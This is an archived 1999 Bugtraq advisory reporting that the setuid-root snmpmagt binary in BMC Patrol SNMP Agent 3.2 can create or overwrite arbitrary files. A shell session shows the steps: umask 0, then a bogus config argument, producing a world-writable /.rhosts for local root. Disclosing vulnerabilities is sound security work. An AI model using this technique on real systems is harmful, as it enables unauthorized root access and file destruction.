=== Content from marc.info_b580876e_20250125_172303.html ===

```
[[prev in list](?l=bugtraq&m=93200124014834&w=2)] [[next in list](?l=bugtraq&m=93215357721034&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=93208322823446&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [Root Perms Gained with Patrol SNMP Agent 3.2 (all others?)](?t=93198310100001&r=1&w=2)
From:       [Andrew Alness <aalness () GTI ! NET>](?a=93198307800002&r=1&w=2)
Date:       [1999-07-13 20:53:27](?l=bugtraq&r=1&w=2&b=199907)
[Download RAW [message](?l=bugtraq&m=93198293132463&q=mbox) or [body](?l=bugtraq&m=93198293132463&q=raw)]

Problem in Patrol 3.2
---------------------

vendor:
Copyright 1993-97 BMC Software, Inc.

how bad:
local root/denial of service

example:

maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin> ls -al snmpmagt
-rwsr-xr-x   1 root       users       185461 Mar  6  1998 snmpmagt*

maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin> ls -al /.rhosts
/.rhosts not found

maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin> umask 0

(first argument must be either an invalid config file or a file that doesn't exist)
maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin> snmpmagt yoyoyo /.rhosts
yoyoyo: No such file or directory
snmp bind failure: Address already in use
/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin/snmpmagt: error processing configuration

maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin> ls -al /.rhosts
-rw-rw-rw-   1 root       users          770 Jul 13 14:42 .rhosts

note: if the file exists it keeps the same perms, otherwise creates it
with perms based on your umask and chown's to whoever owns the parent
directory of the file you're creating. if the file exists it overwrites it
with "i^A" then the result of gethostname() and some whitespace. this
problem is not platform dependent and was tested based on out of box
install on an HP.

- aalness@gti.net

[[prev in list](?l=bugtraq&m=93200124014834&w=2)] [[next in list](?l=bugtraq&m=93215357721034&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=93208322823446&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


